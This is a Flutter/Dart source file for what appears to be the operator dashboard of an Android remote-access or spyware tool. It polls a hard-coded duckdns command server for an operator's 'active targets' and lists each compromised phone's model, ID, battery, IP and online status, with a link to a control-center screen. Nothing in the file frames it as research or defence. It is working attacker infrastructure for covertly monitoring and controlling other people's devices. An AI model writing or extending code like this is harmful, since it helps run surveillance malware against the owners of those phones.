import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'control_panel.dart';

class DeviceDashboardPage extends StatefulWidget {
  final String username;

  const DeviceDashboardPage({super.key, required this.username});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _fetchDevices();
    _timer = Timer.periodic(const Duration(seconds: 10), (timer) => _fetchDevices());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    try {
      final response = await http.get(
        Uri.parse("http://febznihhh.duckdns.top:11837/api/list-targets?username=${widget.username}"),
      );

      if (response.statusCode == 200) {
        if (mounted) {
          setState(() {
            _devices = jsonDecode(response.body);
            _isLoading = false;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching devices: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    int activeCount = _devices.where((d) => d['status'] == "Online").length;

    // Warna merah darah
    final Color bloodRed = const Color(0xFFB71C1C);
    final Color lightBloodRed = const Color(0xFFE53935);
    final Color redAccent = const Color(0xFFD32F2F);

    return Scaffold(
      backgroundColor: const Color(0xFF0A0C10),
      body: SafeArea(
        child: Stack(
          children: [
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Header dengan aksen merah
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 15),
                  decoration: BoxDecoration(
                    color: const Color(0xFF12161E),
                    borderRadius: const BorderRadius.only(
                      bottomLeft: Radius.circular(20),
                      bottomRight: Radius.circular(20),
                    ),
                    border: Border(bottom: BorderSide(color: bloodRed.withOpacity(0.3))),
                  ),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text("ACTIVE TARGETS", style: TextStyle(color: bloodRed, fontSize: 8, letterSpacing: 1)),
                          const SizedBox(height: 4),
                          Text("$activeCount", style: TextStyle(color: lightBloodRed, fontSize: 20, fontWeight: FontWeight.bold)),
                        ],
                      ),
                      GestureDetector(
                        onTap: _fetchDevices,
                        child: Icon(Icons.radar, color: redAccent.withOpacity(0.8), size: 30),
                      ),
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.end,
                        children: [
                          Text("OPERATOR", style: TextStyle(color: Colors.white54, fontSize: 8, letterSpacing: 1)),
                          const SizedBox(height: 4),
                          Text(widget.username.toUpperCase(), style: TextStyle(color: lightBloodRed, fontSize: 14, fontWeight: FontWeight.bold)),
                        ],
                      ),
                    ],
                  ),
                ),
                
                const SizedBox(height: 15),
                
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text(
                        "CONNECTED DEVICES", 
                        style: TextStyle(color: redAccent, fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1.5)
                      ),
                      GestureDetector(
                        onTap: () => Navigator.pop(context), 
                        child: const Icon(Icons.close, color: Color(0xFFE53935), size: 18),
                      )
                    ],
                  ),
                ),
                
                const SizedBox(height: 10),

                Expanded(
                  child: _isLoading 
                    ? Center(child: CircularProgressIndicator(color: bloodRed))
                    : _devices.isEmpty 
                      ? Center(
                          child: Text("NO TARGETS FOUND FOR THIS OPERATOR", 
                          style: TextStyle(color: bloodRed, fontWeight: FontWeight.bold, letterSpacing: 2)))
                      : GridView.builder(
                          padding: const EdgeInsets.symmetric(horizontal: 15, vertical: 10),
                          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                            crossAxisCount: 3, 
                            crossAxisSpacing: 8,
                            mainAxisSpacing: 8,
                            childAspectRatio: 0.75, 
                          ),
                          itemCount: _devices.length,
                          itemBuilder: (context, index) {
                            final device = _devices[index];
                            bool isActive = device['status'] == "Online"; 
                            Color statusColor = isActive ? lightBloodRed : Colors.redAccent;

                            return GestureDetector(
                              onTap: () {
                                Navigator.push(
                                  context,
                                  MaterialPageRoute(
                                    builder: (context) => const ControlCenterPage(),
                                    settings: RouteSettings(arguments: {
                                      "device": device,
                                      "operator": widget.username,
                                    }),
                                  ),
                                );
                              },
                              child: Container(
                                padding: const EdgeInsets.all(8),
                                decoration: BoxDecoration(
                                  color: const Color(0xFF0F1116),
                                  borderRadius: BorderRadius.circular(12),
                                  border: Border.all(
                                    color: isActive ? bloodRed.withOpacity(0.6) : Colors.white12,
                                    width: 1,
                                  ),
                                ),
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Row(
                                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                      children: [
                                        const Icon(Icons.phone_android, color: Colors.white54, size: 14),
                                        Container(
                                          padding: const EdgeInsets.symmetric(horizontal: 4, vertical: 2),
                                          decoration: BoxDecoration(
                                            border: Border.all(color: statusColor.withOpacity(0.5)),
                                            borderRadius: BorderRadius.circular(8),
                                          ),
                                          child: CircleAvatar(radius: 2.5, backgroundColor: statusColor),
                                        ),
                                      ],
                                    ),
                                    
                                    const Spacer(),
                                    
                                    Text(
                                      device['model'] ?? "Unknown",
                                      style: TextStyle(color: lightBloodRed, fontSize: 10, fontWeight: FontWeight.bold),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    const SizedBox(height: 2),
                                    Text(
                                      device['id'] ?? "NO-ID",
                                      style: const TextStyle(color: Colors.white24, fontSize: 7),
                                      maxLines: 1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                    
                                    const Spacer(),
                                    
                                    Row(
                                      children: [
                                        const Icon(Icons.battery_charging_full, color: Colors.white54, size: 10),
                                        const SizedBox(width: 2),
                                        Text(
                                          "${device['battery'] ?? '0'}%", 
                                          style: const TextStyle(color: Colors.white70, fontSize: 8, fontWeight: FontWeight.bold)
                                        ),
                                      ],
                                    ),
                                    const SizedBox(height: 4),
                                    Text(
                                      "IP: ${device['ip'] ?? 'Hidden'}", 
                                      style: const TextStyle(color: Colors.white24, fontSize: 6),
                                      maxLines: 1,
                                    ),
                                  ],
                                ),
                              ),
                            );
                          },
                        ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}